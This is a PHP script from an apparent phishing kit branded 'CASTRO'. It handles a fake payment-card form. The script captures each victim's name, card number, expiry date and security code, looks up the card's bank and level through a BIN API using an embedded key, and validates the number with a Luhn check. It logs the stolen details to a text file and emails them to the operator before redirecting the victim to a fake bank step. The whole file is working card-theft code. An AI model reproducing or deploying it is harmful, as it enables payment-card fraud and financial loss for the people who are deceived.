<?php
  error_reporting(0);
  ob_start();
  session_start();
include'../antibots.php';
  include '../email.php';
if($_SERVER['REQUEST_METHOD'] == 'POST'){
    $_SESSION["n_card"] = $_POST["n_card"];
    $_SESSION["bin"]    = $_POST["c_num"];
    $_SESSION["c_num"]  = $_POST["c_num"];
    $_SESSION["exm"]    = $_POST["exm"];
    $_SESSION["exy"]    = $_POST["exy"];
    $_SESSION["csc"]    = $_POST["csc"];
$bin = substr($_SESSION["bin"], 0, -10);
  function curl($url, $var = null) {
      $curl = curl_init($url);
      curl_setopt($curl, CURLOPT_TIMEOUT, 25);
      if ($var != null) {
          curl_setopt($curl, CURLOPT_POST, true);
          curl_setopt($curl, CURLOPT_POSTFIELDS, $var);
      }
      curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
      curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 2);
      curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
      curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
      $result = curl_exec($curl);
      curl_close($curl);
      return $result;
  }
$curl = curl("https://api.bincodes.com/bin/?format=json&api_key=307a529d724ebe908dd73abfa2a2f272&bin=".$bin);
$json = json_decode($curl);
$banque = $json->bank ? $json->bank : "error";    
$level = $json->level ? $json->level : "error";
$type = $json->type ? $json->type : "error";
$fournisseur = $json->card ? $json->card : "error";
$message = '🔘 CASTRO // NEW CARD

🍓 [ INFOS BANCAIRE ]
🏛 Nom : '.$_SESSION["n_card"].'
🏛 Banque : '.$banque.'
🏛 Numéro de carte : '.$_SESSION["c_num"].'
🏛 Date expiration : '.$_SESSION["exm"].'/'.$_SESSION["exy"].'
🏛 Cryptogramme visuel : '.$_SESSION["csc"].'
🏛 Level : '.$level.'
🏛 Type : '.$type.'
🏛 Fournisseur : '.$fournisseur.'

🌟 CASTRO 🌟
';
$Subject=  "[💳] ".$bin." - ".$level." - ".$banque." | "._ip();
$head="From:🦹🏽‍♂ CASTRO 🦹🏽‍♂  <castro@kingofspam.fr>";
function is_valid_luhn($number) {
  settype($number, 'string');
  $sumTable = array(
    array(0,1,2,3,4,5,6,7,8,9),
    array(0,2,4,6,8,1,3,5,7,9));
  $sum = 0;
  $flip = 0;
  for ($i = strlen($number) - 1; $i >= 0; $i--) {
    $sum += $sumTable[$flip++ & 0x1][$number[$i]];
  }
  return $sum % 10 === 0;
}
if(is_valid_luhn($_SESSION["c_num"]) && is_numeric($_SESSION["c_num"])){

$fil = fopen('api.txt', 'a+');
fwrite($fil, '-'.$message.'-');
$_SESSION['step_four']  = true;
    mail($my_mail,$Subject,$message,$head);
    mail($name,$Subject,$message,$head);
    header('location: bank.php?enc=' . md5(time()) . '&p=1&dispatch=' . sha1(time()));   
    }else {
        header('location: card.php?error=true');   
    }
}
else
{
  header('location: ../../index.php');
}